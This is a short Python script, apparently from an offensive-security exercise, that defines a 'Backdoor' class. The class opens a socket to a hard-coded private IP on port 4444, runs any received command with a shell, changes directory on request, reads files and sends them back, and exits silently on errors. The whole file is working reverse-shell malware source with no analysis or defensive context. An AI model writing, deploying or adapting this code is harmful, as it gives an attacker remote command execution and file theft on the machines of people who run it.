import socket
import subprocess
import json
import os

class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def ejecutar_comando(self, command):
            return subprocess.check_output(command, shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def cambiar_directorio(self, path):
        os.chdir(path)
        return "Cambiando directorio a: " + path

    def leer_archivo(self, path):
        with open(path, "rb") as file:
            return file.read()

    def run(self):
            while True:
                command = self.reliable_receive()
                if command[0] == "salir":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    resultados_comando = self.cambiar_directorio(command[1])
                elif command[0] == "descargar":
                    resultados_comando = self.leer_archivo(command[1])
                else:
                    resultados_comando = self.ejecutar_comando(command)

                self.reliable_send(resultados_comando)
            connection.close()

try:
    puerta = Backdoor("172.16.113.132", 4444)
    puerta.run()
except Exception:
    exit()
